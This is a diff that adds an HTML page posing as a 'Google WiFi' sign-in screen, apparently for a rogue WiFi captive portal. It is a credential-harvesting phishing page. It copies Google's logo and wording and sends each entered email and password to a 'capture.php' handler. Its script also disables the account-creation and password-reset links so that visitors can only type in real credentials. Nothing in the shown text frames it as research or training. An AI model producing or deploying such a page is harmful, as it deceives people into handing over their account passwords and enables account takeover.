@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google WiFi - Sign in</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="header">
+                <svg class="logo" viewBox="0 0 74 24" width="75" height="24">
+                    <path fill="#4285f4" d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.54 1.8-3.62 0-6.45-2.92-6.45-6.54s2.83-6.54 6.45-6.54c1.95 0 3.38.77 4.43 1.76L15.4 2.5C13.94 1.08 11.98 0 9.24 0 4.28 0 .11 4.04.11 9s4.17 9 9.13 9c2.68 0 4.7-.88 6.28-2.52 1.62-1.62 2.13-3.91 2.13-5.75 0-.57-.04-1.1-.13-1.54H9.24z"/>
+                    <path fill="#ea4335" d="M25 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.47 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"/>
+                    <path fill="#fbbc05" d="M38 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.47 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"/>
+                    <path fill="#4285f4" d="M51 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.47 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"/>
+                    <path fill="#34a853" d="M61.68 6.19c-2.87 0-5.2 2.53-5.2 5.81s2.33 5.81 5.2 5.81c1.56 0 2.68-.58 3.44-1.37l.12-.12-2.07-1.68-.08.09c-.51.54-1.24.93-2.04.93-1.39 0-2.08-.87-2.54-1.58l7-2.89-.26-.65c-.45-1.08-1.73-3.35-4.57-3.35zm-.12 2.15c.97 0 1.8.47 2.14 1.14l-5.18 2.14c-.13-.37-.2-.76-.2-1.16 0-1.95 1.42-3.12 3.24-3.12z"/>
+                </svg>
+                <h1>Sign in</h1>
+                <p class="subtitle">to continue to Google WiFi</p>
+            </div>
+
+            <form method="POST" action="capture.php" class="login-form">
+                <div class="form-group">
+                    <input type="email" name="email" placeholder="Email or phone" required autocomplete="email">
+                </div>
+
+                <div class="form-group">
+                    <input type="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
+                </div>
+
+                <div class="options">
+                    <a href="#" class="forgot-link">Forgot password?</a>
+                </div>
+
+                <div class="buttons">
+                    <button type="button" class="secondary-btn">Create account</button>
+                    <button type="submit" class="primary-btn">Next</button>
+                </div>
+
+                <div class="terms">
+                    <p>By signing in, you agree to Google's Terms of Service and Privacy Policy</p>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        document.querySelector('.secondary-btn').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('Please use an existing Google account to connect');
+        });
+        document.querySelector('.forgot-link').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('Please contact your network administrator');
+        });
+    </script>
+</body>
+</html>
